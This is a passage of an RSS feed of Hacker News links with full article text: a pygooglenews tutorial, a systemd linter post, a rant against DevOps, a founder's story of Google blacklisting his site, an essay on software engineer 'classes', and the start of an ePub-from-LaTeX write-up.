top_news = gn.top_news()</code></pre><p>To know more about the supported languages and countries, check <a href="https://github.com/kotartemiy/pygooglenews#googlenews-class">here</a>.</p><h3 id="2-google-news-articles-by-topic">2. Google News articles by topic</h3><p>Accepted topics are:</p><ul><li><code>WORLD</code></li><li><code>NATION</code></li><li><code>BUSINESS</code></li><li><code>TECHNOLOGY</code></li><li><code>ENTERTAINMENT</code></li><li><code>SCIENCE</code></li><li><code>SPORTS</code></li><li><code>HEALTH</code></li></ul><pre><code>from pygooglenews import GoogleNews

# default GoogleNews instance
gn = GoogleNews(lang = 'en', country = 'US')

business = gn.topic_headlines('BUSINESS')</code></pre><p>In addition to these preset topics you may also parse custom ones, such as "COVID-19". &nbsp;Check more in this part of the <a href="https://github.com/kotartemiy/pygooglenews#stories-by-topic-1">documentation</a>. </p><h3 id="3-google-news-articles-by-geolocation">3. Google News articles by geolocation</h3><pre><code>from pygooglenews import GoogleNews

# default GoogleNews instance
gn = GoogleNews(lang = 'uk', country = 'UA')

kyiv = gn.geo_headlines('kyiv')
# or 
kyiv = gn.geo_headlines('kiev')
# or
kyiv = gn.geo_headlines('киев')
# or
kyiv = gn.geo_headlines('Київ')</code></pre><p>All of the 4 options presented above will return the same news feed about Kyiv, Ukraine. Google News will "autoparse" the place name. It also seems to be language agnostic but it doesn't mean that all places feeds will be present for all languages. </p><h3 id="4-google-news-articles-by-your-custom-search">4. Google News articles by your custom search</h3><pre><code>from pygooglenews import GoogleNews

# default GoogleNews instance
gn = GoogleNews(lang = 'en', country = 'US')

# find all latest news about NFT
s = gn.search('NFT')</code></pre><p>Here you can pass any keywords that you want. </p><p>pygooglenews helps you with all the URL-escaping that is required by Google Newsю</p><p>Some <strong>advanced search parameters</strong> that you might want to add (check this part of the <a href="https://github.com/kotartemiy/pygooglenews">documentation</a>):</p><ul><li>restrict search to some particular date</li><li>exclude/include keywords</li><li>exact match</li><li>search for keywords to be present in the title</li></ul><p>Check <a href="https://github.com/kotartemiy/pygooglenews#advanced-querying-search-examples">advanced examples</a> to have a better understanding.</p><hr><p>If you liked this post, or you're using our package, please just share this blog post! This will help us get better SEO. </p>
                </div>
            </section>



        </article>

    </div>
</div></div>]]>
            </description>
            <link>https://blog.newscatcherapi.com/scraping-google-news/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26357543</guid>
            <pubDate>Fri, 05 Mar 2021 15:02:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Systemd needs (or could use) a linter for unit files]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26357456">thread link</a>) | @zdw
<br/>
March 5, 2021 | https://utcc.utoronto.ca/~cks/space/blog/linux/SystemdUnitLinterNeed | <a href="https://web.archive.org/web/*/https://utcc.utoronto.ca/~cks/space/blog/linux/SystemdUnitLinterNeed">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2>Systemd needs (or could use) a linter for unit files</h2>

	<p><small>March  4, 2021</small></p>
</div><div><p>Today <a href="https://twitter.com/thatcks/status/1367592927128522755">I made a discovery</a>:</p>

<blockquote><p>Today's Fedora packaging failure:
/usr/lib/systemd/system/lttng-session.service (from lttng-tools) is a
PGP key, not a systemd .service unit. (Insert joke about people once
again not managing to use PGP properly)</p>

<p>Yes, bug filed: <a href="https://bugzilla.redhat.com/show_bug.cgi?id=1935426">#1935426</a></p>
</blockquote>

<p>I discovered this because I was watching '<code>journalctl -f</code>' while I
upgraded my office workstation to Fedora 33 in <a href="https://utcc.utoronto.ca/~cks/space/blog/linux/FedoraUpgradeDrag">my usual way</a>. The upgrade process causes systemd to re-examine
your unit files and complain about things. Most of the complaints
were normal ones like:</p>

<blockquote><pre>mcelog.service:8: Standard output type syslog is obsolete, automatically updating to journal. Please update your unit file, and consider removing the setting altogether
xinetd.service:10: PIDFile= references a path below legacy directory /var/run/, updating /var/run/xinetd.pid â†’ /run/xinetd.pid; please update the unit file accordingly.
</pre>
</blockquote>

<p>But mixed in with those complaints I noticed the much more unusual:</p>

<blockquote><pre>lttng-sessiond.service:1: Assignment outside of section. Ignoring.
lttng-sessiond.service:3: Assignment outside of section. Ignoring.
[.. for a bunch more lines ..]
</pre>
</blockquote>

<p>That made me curious what was in the file, whereupon I discovered
that it was actually a PGP public key instead of a systemd unit
file.</p>

<p>We can laugh at this mistake because it's funny in several different
ways (given that it involves PGP for extra spice). But it's actually
pointing out a systematic problem, one that is also illustrated by those
other messages about other systemd units, which is that there's no easy
way to check your unit files to see if systemd is happy with them. In
other words, there is no linter for systemd unit files.</p>

<p>If there was a linter, none of these problems would be there, or at
least any that were still present would be ones that Fedora (or any
other Linux distribution) had decided were actually okay. With a linter,
Linux distributions could make it a standard packaging rule (in whatever
packaging system they use) that all systemd units in a package had to
pass the linter; this would have automatically detected the lttng-tools
problem, probably among others. Without a linter, the only way to
detect systemd unit problems is to enable them and see if systemd
complains. This is not something that's easy to automate, especially
during package builds, and so it's fallible and limited.</p>

<p>(Because of that it invites people to file bugs for things that may not
be bugs. Are these issues with the PIDFile location actual oversights in
the packaging or an area where Fedora's standard doesn't line up with
the systemd upstream? I can't tell.)</p>

<p>An automatically applied linter would be especially useful for the
less frequently used packages and programs, where an issue has a much
easier time lurking for some time. Probably not very many people have
lttng-tools even installed on Fedora, and clearly not very many of them
use things that require the lttng sessiond service.</p>

<p>PS: This isn't the only systemd project where standards have changed and
some systemd bit is now complaining. Systemd-tmpfiles complains about
various things wanting to clean up bits in /var/run, for example.</p>
</div></div>]]>
            </description>
            <link>https://utcc.utoronto.ca/~cks/space/blog/linux/SystemdUnitLinterNeed</link>
            <guid isPermaLink="false">hacker-news-small-sites-26357456</guid>
            <pubDate>Fri, 05 Mar 2021 14:54:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[DevOps Is a Poorly Executed Scam (2011)]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26357352">thread link</a>) | @Fiveplus
<br/>
March 5, 2021 | http://widgetsandshit.com/teddziuba/2011/03/devops-scam.html | <a href="https://web.archive.org/web/*/http://widgetsandshit.com/teddziuba/2011/03/devops-scam.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><img src="http://widgetsandshit.com/teddziuba/images/and-this-is-a-poorly-executed-troll.png">I've got to hand it to the Agile development guys — they were really good at liberating money out of organizations that all had trouble with something inherently difficult. The geniuses who developed Scrum and Extreme Programming executed masterfully; selling books and training; and they made some serious bank doing it. If you hang around Silicon Valley long enough, you know to applaud the hustle.  It's the classic <em>Rainmaker</em> scam.  You pay a man to make it rain on your crops, and when it rains, he takes the credit. If it doesn't rain, he comes up with an excuse that involves you paying more money.</p>

<p>So, given that, I'm befuddled by the Devops movement. It's got the potential to make a handful of people a lot of money in the same way that Agile did, but nobody is really executing on it. It's proper snake oil with all the trimmings: prescription of "culture change", few and vague concrete steps for implementation, and most of all, the promise to solve an age old problem.</p>

<h3>How do you implement Devops?</h3>

<p>Point one. Nobody seems to know. At least with Scrum, you could buy the book and take the course. From what I have gathered by reading blogs, if you want to apply Devops to organization, you do any or all of these things:

</p><ul>
  <li><em>Automate configuration with Puppet or whatever.</em> You should be doing this anyway. Not earth shattering.</li>
  <li><em>One-step build and deploy.</em> I'm still waiting for you tell me how these steps will solve my problems.</li>
  <li><em>Culture of respect &amp; trust, good attitude toward failure.</em> How about "culture of <em>stop fucking up</em>"? This is one of those obvious happy-horseshit type statements that makes you believe the salesman is benevolent. A developer who consistently ships broken code or a sysadmin who consistently pushes out broken configuration aren't going to get any better with respect or trust.</li>
  <li><em>Have cross-functional team members to facilitate communication</em> Every technical person you hire should be cross functional enough that you don't need this.</li>
</ul><p>

These things are all the basics you pick up by reading <em>Learn How Not to be a Complete Failure at Software Development in 24 Hours</em>. None of it will make your developers any less prone to do stupid shit, and none of it will prevent your systems administrators from roadblocking developers just for funsies.</p>

<p>One of the things I read frequently is that <em>Devops is about building bridges and communication</em>. What the shit does that even mean? Cute, but not useful. Clearly everybody deserves to be treated with respect in the workplace, but you can't make two different groups work together just by telling them to, or even by having cross-functional team members to coordinate. If you've hired people explicitly as peacemakers between development and ops, you fucked up somewhere in your hiring process; it's fixing a self-inflicted problem.</p>

<p>If you are going to pimp this stuff as "the new way of doing things", at least try to sell me a book.</p>

<h3>What is the problem you want to solve?</h3>
<p>The main issue with the Devops movement is that it treats symptoms, not problems. Yes, everybody wants to ship new code frequently and keep it stable, but the dev vs. ops feud is as old as the phrase "it's 98% done, I just have to test it". The symptoms of the problem are these:

</p><ul>
  <li>Developers write code on their workstations and it doesn't work in production.</li>
  <li>Systems administrators are slow and reluctant to change production configurations.</li>
</ul><p>

As a result, it takes longer to ship features than it should.</p>

<p>The underlying problem, however, is that dev and ops have different goals, and each group's problem solving skills is a product of those goals. The Devops movement does try to cultivate some kind of understanding that developers and systems administrators are both working toward the same end, to put food on the table, but you will never be able to effect cultural change just by saying so. <em>Surly's only looking out for one person, and that's Surly.</em></p>

<h3>What condition your condition is in</h3>

<p>You will always have problems between development and operations if the two groups think so differently about technical problems. So, I offer a test. One technical question that will show you how different development and operations really are:

</p><blockquote>
Devise a caching infrastructure for responses from the Google Maps Geocoder API.
</blockquote><p>

The end. Gather dev in one room, and ops in the other, and have them each come up with an answer. If they come up with the same answer, there is hope for your organization. If they don't, put them in one room and have them work it out until there is a unanimous solution, and everyone agrees that it is the best. If they can't agree on a solution, you have problems that no methodology can fix. (For bonus points, make this a universal interview question.)</p>

<p>After that exercise, development and operations should reasonably be on the same page. Next, you need to implement policy that will force convergence between development and operations. This is my prescription:

</p><ul>
  <li><em><strong>Developers are in the on-call rotation</strong></em> If you ship a feature, you help support it. This one is first because it's the most important. If you architect a system, you write the Nagios alerts for it, and they page your phone. Believe me, you will get a crystal clear understanding of why ops throws up so many roadblocks after doing this for a few months.</li>
  <li><em><strong>Developers develop in the same environment production runs in</strong></em> If you deploy to Linux, you develop on Linux. No more of this coding on your Macbook Pro and deploying to Ubuntu: that is why you can't have nice things.</li>
  <li><em><strong>Downtime never happens twice</strong></em> After problems are fixed short-term, you make it first priority to ensure that the same failure does not happen again.</li>
</ul><p>

That's it. When developers are woken up during downtime, they will adjust their attitude toward operations in a hurry. Yes, the site is down because your architecture sucks. No, cosmic rays did not flip bits in RAM. Clearly, you want development and ops to solve problems collaboratively, and it just won't work if the two groups are too different.</p>

<p>Since no methodology peddler ever wants to say this, I will: <em>there's a point where you're simply fucked.</em> Meaning, you can't solve the problem with the tools available. Sometimes, you have to fire people who aren't working out. Sometimes, you're too deep in technical debt and too pressed for time to do it the "right way". And sometimes, projects fail. It is what it is. This isn't defeatist, it's realist.</p>

<p>I am not trying to sell you a book, I am just being honest about the problems you face. None of this amounts to a <em>methodology</em>, as the Devops people would have you believe. If your developers and your sys admins are so culturally different that they can't agree on a solution to a simple technical problem, then your organization will not be fixed by some sunshine-up-your-ass methodology you read about in a blog or hear about at a conference. You need to change the culture the hard way, or replace people as necessary until the culture works.</p>
<p>The Devops movement smells of a scam in the making, not that I have any problem with that, after all, don't knock the hustle. However, I'd rather not see people with real problems get roped in, thinking that there's a magical 12-step program that will solve deep rooted problems. It just doesn't work that way. Even so, the Devops people have a bit of traction, and they're failing to capitalize on it. You've got a good thing going here, <em><strong>profit</strong></em> from that shit. Books, training, conferences, the whole bit. Get down to it.</p>
</div></div>]]>
            </description>
            <link>http://widgetsandshit.com/teddziuba/2011/03/devops-scam.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26357352</guid>
            <pubDate>Fri, 05 Mar 2021 14:45:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Thanks HN: Lessons learned after Google nearly killed my site]]>
            </title>
            <description>
<![CDATA[
Score 491 | Comments 254 (<a href="https://news.ycombinator.com/item?id=26357033">thread link</a>) | @uploaderwin
<br/>
March 5, 2021 | https://www.uploader.win/blog/ | <a href="https://web.archive.org/web/*/https://www.uploader.win/blog/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                <div class="page">
                    
                    
                    <p><span>I am the creator of Uploader window, a website that helps users to add an upload widget to their own apps or websites.</span></p>
                    
                    <p><span>We’ve been running this website for almost 3 years without any issues (<a href="https://www.uploader.win/about.html">since 2017</a>). </span><span>But something happened yesterday that almost shutdown my entire business at a moment’s notice.</span></p>
                    
                    <p><span>My Whatsapp started ringing. In addition to email support I give many paying users my personal WA number for emergencies. It was a message from a client using our services for over 2+ years now. He said that they are getting a warning on their site because of our script. Anybody
                        visiting any site in which my clients integrated my app were also showing this red screen of death.</span></p>
                    
                    <p><span><a href="https://www.uploader.win/blog/assets/whatsapp.png" target="_blank"><img src="https://www.uploader.win/blog/assets/whatsapp.png"></a></span></p>
                    
                    <p><span>I opened my Inbox and there was another email from a client about the same issue.</span></p>
                    
                    <p><span>Now we run automated tests to monitor server uptime and check server for problems every 30 seconds. Unfortunately automated test scripts were happily getting HTTP/200 replies while people using the Chrome browser were being told this is a scam business trying to
                        steal their
                        bank account information.</span></p>
                    <p><span>Not knowing the first thing about what had happened I started looking for ways I could fix it quickly. And this is when I realized that while it was something new to me, </span><span>it has been happening for a very long time and many businesses are affected by it.
                        All because this whole process for getting blacklisted is pretty automatic and
                        you don’t
                        really know about it until you’re actually blacklisted.</span></p>
                    <p><span><a href="https://news.ycombinator.com/item?id=5971403" target="_blank"><img src="https://www.uploader.win/blog/assets/other-people.png"></a></span></p>
                    
                    
                    <p><span>Lesson #1: The first place to look is Google webmaster tools</span></p>
                    
                    <p><span>I never got any email from Google but as many articles suggested the best place to start is inside the <a href="https://developers.google.com/search" target="_blank">GWT</a> (renamed Search Central). As soon as I added my site to GWT, I got a big red security issue that my site
                        has been categorized as a deceptive phishing site which harms customers. It also listed my homepage as the deceptive page. </span>
                    </p>
                    
                    <p><span><a href="https://www.uploader.win/blog/assets/gwt.png" target="_blank"><img src="https://www.uploader.win/blog/assets/gwt.png"></a></span></p>
                    
                    <p><span>It was issued a few hours ago and I was already on 5 blacklists in a matter of a few hours. Soon firefox users started seeing a warning too. </span></p>
                    
                    <p><span>I checked the source code of my homepage, checked all Javascripts by hand, manually logged in to my server and checked all running processes on my servers to see if in fact we had been hacked. <b>Nothing, absolutely nothing was changed.</b></span></p>
                    
                    <p><span>There was a box to submit your site for a review but it didn’t say how much time it would take. Some said it may take upto 4 days, other sites said it could be even longer! </span><span>My business would most certainly be dead if it took that long.</span></p>
                    
                    <p><span>Nevertheless I submitted for a review and that was it.</span></p>
                    
                    <p><span>Lesson #2: Hacker news is the next best place to ask for help</span></p>
                    
                    <p><span>When searching for why this has happened and ways to fix it I stumbled upon similar threads from Hacker news. <span>It seems a lot of other people have been victims of Google's trigger-happy blacklisting and it’s not an easy fix.</span></span></p>
                    
                    <p><span>Once you’re listed, you get <b>bumped off Google search results and all users are banned from visiting your site</b> (some users said they couldn’t even access it after accepting the advanced warning). Basically it’s `poweroff -h` for your site.</span></p>
                    
                    <p><span>But there are plenty of Google engineers and good helpful people on Hacker news. People who go out of their way to help others</span></p>
                    
                    <p><span><a href="https://news.ycombinator.com/item?id=5972927" target="_blank"><img src="https://www.uploader.win/blog/assets/helpful-googlers.png"></a></span></p>
                    
                    <p><span>I was super tempted to contact this person directly but I decided it isn't very polite to bother people like this. Instead I posted my own thread mainly looking for advice on how I can expedite the review process and maybe learn what the hell had happened yesterday.</span></p>
                    
                    
                    <p><span>I listed all the reasons I could think off and people were quick to help. My call for help quickly reached HN’s homepage and I finally figured out what had happened</span></p>
                    
                    <p><span><a href="https://news.ycombinator.com/item?id=26326528" target="_blank"><img src="https://www.uploader.win/blog/assets/hn-thread.png"></a></span></p>
                    <p><span>Lesson #3: Never link to any user content from your main domain (or any subdomain or even redirects)</span></p>
                    
                    <p><span>So after a lot of brainstorming and ideas from HNers I finally figured out the culprit(s). </span></p>
                    
                    <p><span>We have a live demo on our home where people can upload a test file. The demo is a way for users to actually see how the uploader will look in their own apps. It's a way for users to test drive the site without actually signing up.</span></p>
                    
                    <p><span><i>Visitors love the demo. It greatly helps our conversions.</i> I did think the demo could be used for file piracy so any files uploaded to the demo are automatically deleted after 24 hours. We never allow anything other than video and image files either. And we host the files
                        on a
                        cdn, so they
                        are linked using a subdomain (cdn.uploader.win)</span></p>
                    
                    <p><span>We also give all users a 20MB test storage. This is to help them integrate the Uploader in their own site during development.</span></p>
                    
                    <p><span>I believe that somebody signed up for our service (it’s free to sign up) and then uploaded a malicious file on our test storage and abused this feature.</span></p>
                    
                    
                    <p><span>We cannot unfortunately disable the live demo or remove the test storage because they both serve a purpose. But there are few things we can do to mitigate it in future:</span></p>
                    
                    <ul>
                        <li><span>Link to any user uploaded content using a separate domain altogether (never main domain or subdomain). </span></li>
                        <li><span>Expire test files quickly. Every few minutes instead of 24 hours.</span></li>
                        <li><span>If you are giving users any scripts to integrate on their site make sure to host them on a separate domain.</span></li>
                    </ul>
                    
                    <p><span>Lesson #4: Don’t use base-64 images (or inline images)</span></p>
                    
                    <p><span>I’m not 100% sure about this but while I was frantically trying to scan my website using various online services a lot of them warned about using base64 content in the homepage. </span></p>
                    
                    
                    <p><span><a href="https://news.ycombinator.com/item?id=26327091" target="_blank"><img src="https://www.uploader.win/blog/assets/base64.png"></a></span></p>
                    <p><span>Also if you remember Google did not say it was the subdomain rather it linked directly to my homepage as hosting the deceptive content.</span></p>
                    
                    <p><span>The reason for adding inline images is to reduce the number of HTTP requests (which speeds up the page load). This got us a good score on Pagespeed insights but at the same time a lot of online virus scanners do frown upon pages that do it. </span></p>
                    
                    <p><span>Since I will never know what I did wrong I just removed all inline content (as suggested by some HNers).</span></p>
                    
                    
                    <p><span>Again this is just hypothesis and it may or may not have been the case... but why take chances?</span></p>
                    
                    <p><span>Lesson #5: Communicating with your customers can be super helpful</span></p>
                    
                    <p><span>My biggest worry in all this was how it would affect my customers who depend on my site for uploads. I was feeling so helpless and anxious. </span></p>
                    
                    <p><span>So I decided to instead communicate directly with some customers while I was waiting for resolution. Not only were most of my customers super supportive but I also realized that most of my customers are just developers like me and understood that things like this happen and
                        cannot be
                        controlled. </span></p>
                    
                    <p><span><a href="https://www.uploader.win/blog/assets/whatsapp2.png" target="_blank"><img src="https://www.uploader.win/blog/assets/whatsapp2.png"></a></span></p>
                    
                    <p><span>Such words brought down my stress level from 100 to 60 :) </span></p>
                    
                    <p><span>Finally Good News!</span></p>
                    
                    <p><span>The whole ordeal was sorted in only 6 to 7 hours</span> and things are great again! <span>I believe the HN thread getting on the homepage tremendously helped me and somebody from Google saw it and expedited the review after all (or maybe I was just lucky
                        who knows). In just 4 hours after posting the thread I heard from Google (got an email this time) that my site was
                        reviewed
                        and removed from blacklist.</span></p>
                    
                    <p><span><a href="https://www.uploader.win/blog/assets/gwt-reply.png" target="_blank"><img src="https://www.uploader.win/blog/assets/gwt-reply.png"></a></span></p>
                    
                    <p><span>It was a great learning experience for me but also a little scary how fragile online businesses are. You can write all the cron jobs to monitor every single part of your business but you can never be prepared for everything. </span></p>
                    
                    <p><span>And when shtf, the best solution is to always be open about what happened and ask for help. There are so many good people who will go out of their way to help you out.</span></p>
                    <p><span>So special thanks to all the people at Hacker news who were not only super helpful with their suggestions and comments, but also helped me get this sorted quickly!</span></p>
                    
                    <p><span><b>P.S.</b> In case you learned something from my experience or liked …</span></p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.uploader.win/blog/">https://www.uploader.win/blog/</a></em></p>]]>
            </description>
            <link>https://www.uploader.win/blog/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26357033</guid>
            <pubDate>Fri, 05 Mar 2021 14:12:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Two Classes of Software Engineer]]>
            </title>
            <description>
<![CDATA[
Score 27 | Comments 61 (<a href="https://news.ycombinator.com/item?id=26356976">thread link</a>) | @wagslane
<br/>
March 5, 2021 | https://qvault.io/2021/03/05/the-two-classes-of-software-engineer/ | <a href="https://web.archive.org/web/*/https://qvault.io/2021/03/05/the-two-classes-of-software-engineer/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text">
<p>“Software engineer” has become a ubiquitous term for people who write, deploy, architect, or sometimes even simply test code. In reality, I think there are two classes of “software engineers”; those who understand computer science well enough to do challenging, innovative work, and those who just get by because they’re familiar with a few high-level tools. The laziness with which the tech industry has adopted the term “software engineer” has made it harder for us to distinguish between the two.</p>
<p>For the sake of this article, I’m going to refer to those who’ve taken the time to study in-depth as “<em>computer scientists</em>“, and those who skipped the boring stuff to learn how to deploy a React portfolio as “<em>developers</em>“. Keep in mind I just need some words to work with, there’s nothing wrong with the term “developer” and there’s nothing magic about the title “computer scientist”.</p>
<p><em>I won’t be talking about the differences in job titles among software engineers. If that’s what you’re here for check out <a href="https://qvault.io/2020/12/09/highest-paying-computer-science-jobs/">this other article on how much money different kinds of engineers make</a>.</em></p>
<h2>It isn’t binary, there’s obviously a spectrum of skill</h2>
<p>Before anyone gets too upset, let me acknowledge that the technical skill level of all software engineers could be divided into as many classes as there are engineers in existence. I’m trying to point out that there seems to be a <em>great divide</em> between those who have taken the time to learn algorithms, data structures, and higher maths, and those who took an 8-week crash course in web development.</p>
<h2>Stop gatekeeping</h2>
<div><figure><img loading="lazy" width="500" height="454" src="https://qvault.io/wp-content/uploads/2021/03/i-am-the-gatekeeper-41079851.jpg" alt="i am the gatekeeper 41079851" srcset="https://qvault.io/wp-content/uploads/2021/03/i-am-the-gatekeeper-41079851.jpg 500w, https://qvault.io/wp-content/uploads/2021/03/i-am-the-gatekeeper-41079851-300x272.jpg 300w, https://qvault.io/wp-content/uploads/2021/03/i-am-the-gatekeeper-41079851-150x136.jpg 150w" sizes="(max-width: 500px) 100vw, 500px" 500w,="" 300w,="" 150w&quot;="" 500px)="" 500px&quot;="" title="i am the gatekeeper 41079851"></figure></div>
<div>
<hr>
<div>
<p><a href="https://www.facebook.com/groups/learncomputerscience">
<img src="https://qvault.io/wp-content/uploads/2021/03/facebooklogo.png">
</a></p><p><i>Having trouble finding a coding job? Need collaborators for your next project?
Want to try to convince us Python &gt; Golang? Join us in our <a href="https://www.facebook.com/groups/learncomputerscience" target="_blank" rel="noopener">free community Facebook group</a> to hang out.</i></p>
</div>
<hr></div>
<p>Sorry, that’s not my intention, and I apologize if I’m doing a poor job of expressing my thoughts. </p>
<p>I think the divide is primarily a result of a simple anecdotal observation I keep making: <strong>After engineers find a job they like, they stop learning the hard stuff.</strong> Many of us browse Hacker News, a coding-related subreddit, or follow tech topics on Twitter. While better than nothing, there’s a big difference in value between brushing up on algorithms and experimenting with a hot new web framework.</p>
<p>My goal is to articulate the importance of <em>continuing education</em>, even after getting that first great job. It doesn’t matter if you got your start by attending college, going to a boot camp, or taking online courses, you can become a “computer scientist” – there’s no reason to settle as a “developer”.</p>
<p>I also want to point out that I don’t think the distinction between the two classes lies simply in a gap of knowledge. Being a “<em>computer scientist</em>” is more about how you approach and embrace <em>learning</em> and less about what you know <em>today</em>. You’ll never know all there is to know about an industry as massive as the software industry, but the way you go about learning (or not learning) is what will make you successful.</p>
<h2>But why? I can make six figures without inverting binary trees</h2>
<p>It’s true that both kinds of software engineers earn similar salaries in their early careers (see <a aria-label="here (opens in a new tab)" href="https://www.coursereport.com/2020-guide-to-coding-bootcamps-by-course-report.pdf" target="_blank" rel="noreferrer noopener nofollow" (opens="" a="" tab)&quot;="" noopener="">here</a> and <a aria-label="here (opens in a new tab)" href="https://www.naceweb.org/job-market/compensation/computer-science-grads-projected-to-be-top-paid-in-major/" target="_blank" rel="noreferrer noopener nofollow" (opens="" a="" tab)&quot;="" noopener="">here</a>). In fact, often when people take the university route (I don’t always recommend that these days) to learn CS, they have a hard time finding their first job because they never became familiar with modern tools and technologies. Maybe they didn’t even learn how to use Git. The difference is that people that started on a “computer science” path will have an easier time learning React, Django, Rails, you name it. On the other hand, those that took a “developer” short-cut will have a harder time figuring out how to scale a moderately complex system if they don’t understand Big O.</p>
<p>In other words, it’s easier to learn the fundamentals and <em>then</em> the high-level tools, rather than the high-level tools and <em>then</em> the fundamentals. If you did it backwards don’t sweat it! The important thing is simply to identify gaps in your knowledge and fill them as you have time.</p>
<p>Over time, and often as soon as the first year of employment, “computer scientists” tend to move towards more fulfilling and well-compensated work, whether that’s well-funded open-source projects, technical leadership, or mission-critical commercial systems. “Developers” tend to continue doing what they’ve always done, learn a new framework, use an ORM to make simple database queries, or render information in a browser using a tool someone else made.</p>
<h2>Demand won’t always be higher than supply</h2>
<p>Currently, the number of people needed in software engineering is still <a aria-label="rapidly increasing (opens in a new tab)" href="http://econdataus.com/claim400k.htm" target="_blank" rel="noreferrer noopener nofollow" increasing="" in="" new="" noopener="">rapidly increasing</a>, but (anecdotally, and if anyone has good data on this please let me know) it seems when I talk with entry-level engineers that they’re having an increasingly hard time landing a <em>first job</em>. With greater competition at the junior levels, it seems more and more apparent that “get-rich-quick” paths <a href="https://qvault.io/2020/11/19/getting-a-job-after-coding-bootcamp-is-hard/">don’t often produce the best results</a>.</p>
<p>If you’re still struggling to find your first job, are wanting to take your career up a level, or you’re simply looking for more job security, taking the time to learn more advanced and specialized subjects is the best path.</p>
<h2>How can I become a “computer scientist”?</h2>
<p>“Computer scientists” find ways to learn CS in-depth, whether through conventional means like taking classes at a local university or by taking the initiative to relentlessly self-teach online. “Developers” tend to exist on the surface understanding, preferring to learn specific languages, frameworks, and technologies rather than their underpinnings. “Developers” only pick up new skills when they feel the fads of the time are changing.</p>
<p>If you seek deeper technical fulfillment, don’t settle for writing CRUD applications and API calls. Don’t be afraid to watch lectures on YouTube, take some challenging CS courses, or start a for-fun project that will require more technical prowess than you’re used to. If you’re interested in learning CS online, check out my other post, “<a href="https://qvault.io/2020/11/18/comprehensive-guide-to-learn-computer-science-online/">A Comprehensive Guide to Learn Computer Science Online</a>“.</p>
<p>If you’re worried about not being able to prove your knowledge if you’re just learning in an unaccredited way online, look into <a href="https://qvault.io/2020/12/15/guide-to-certificate-in-computer-science/">CS certifications</a>.</p>
<div><div>
<h2>Thanks For Reading!</h2>
<p>If you’re interested in furthering your CS career, take our <a href="https://qvault.io/">computer science courses</a></p>
<p>Follow and hit us up on Twitter <a href="https://twitter.com/q_vault" rel="noopener">@q_vault</a> if you have any questions or comments, and if we’ve made a mistake be sure to <a href="https://qvault.io/contact/">let us know</a> so we can get it corrected!</p>
<p><a href="https://mailchi.mp/5c7f5c281bbe/qvault-newsletter-subscribe" rel="noopener">Subscribe</a> to our newsletter for more programming articles</p>
</div></div>

</div></div>]]>
            </description>
            <link>https://qvault.io/2021/03/05/the-two-classes-of-software-engineer/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26356976</guid>
            <pubDate>Fri, 05 Mar 2021 14:06:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Generating ePub from LaTeX]]>
            </title>
            <description>
<![CDATA[
Score 97 | Comments 13 (<a href="https://news.ycombinator.com/item?id=26356903">thread link</a>) | @ivan_ah
<br/>
March 5, 2021 | https://minireference.com/blog/generating-epub-from-latex/ | <a href="https://web.archive.org/web/*/https://minireference.com/blog/generating-epub-from-latex/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-648">
	<div>
		<p>I want to tell you about my journey to produce the ePub files for the <strong>No Bullshit Guide</strong> textbooks. This has been an epic battle with lots of technological obstacles, but I got it working in the end, and the results are beautiful:</p>
<ul>
<li><a href="https://minireference.com/static/excerpts/noBSmath_v5_preview.epub">No Bullshit Guide to Mathematics ePub preview</a></li>
<li><a href="https://minireference.com/static/excerpts/noBSmath_v5_preview.mobi">No Bullshit Guide to Mathematics Mobi preview</a></li>
</ul>
<p>In this blog post, I want to share what I’ve learned about generating ePub and Mobi files from LaTeX source files that contain lots of math equations. I feel this ought to be recorded somewhere for the benefit of other STEM authors and publishers who have LaTeX manuscripts and want to convert them to .epub and .mobi formats. Read on to watch the “How it’s made” episode about math eBooks.</p>
<p>The end-to-end book production pipeline looks like this:</p>
<p><img loading="lazy" src="https://minireference.com/blog/wp-content/uploads/2020/11/ebook_converion_pipeline.png" alt="eBook production pipeline including .tex, .html, .epub, and .mobi formats" width="534" height="328"></p>
<p><strong>Figure 1</strong>: The eBook production pipeline described in this blog post. Each box represents a different markup format and the arrows indicate the software used to convert between formats. The hard step is to produce clean .html+MathJax format from the .tex source. The generation of the other formats is standard.</p>

<p>Historically, the primary tool I used to produce the <strong>No Bullshit Guide</strong> textbooks has always been the pdflatex, which is the most common way to produce PDFs in the LaTeX ecosystem. <strong>The problem</strong> is the <strong>fixed-width layouts of PDF</strong> files are not a good fit for mobile screens and eReader devices with varying screen sizes. Modern publishing is all about reflowable formats like HTML and ePub. If we want more people to learn math, we have to make math textbooks readable on mobile.</p>
<p>The solution for ePub production that I came up with looks like this:</p>
<ul>
<li><strong>Transform</strong> the LaTeX source files to the macros supported by Softcover (using Python scripts for TeX wrangling based on TexSoup, and image conversion using ImageMagic)</li>
<li><strong>Convert</strong> the LaTeX to HTML+MathJax equations (performed using softcover, polytexnic, and Tralics)</li>
<li><strong>Generate</strong> an ePub file from the HTML (orchestrated by softcover based on MathJax, PhantomJS, Inkscape)</li>
<li><strong>(bonus) Convert</strong> the ePub to Mobi (thanks to ebook-convert command line utility that comes with Calibre)</li>
</ul>
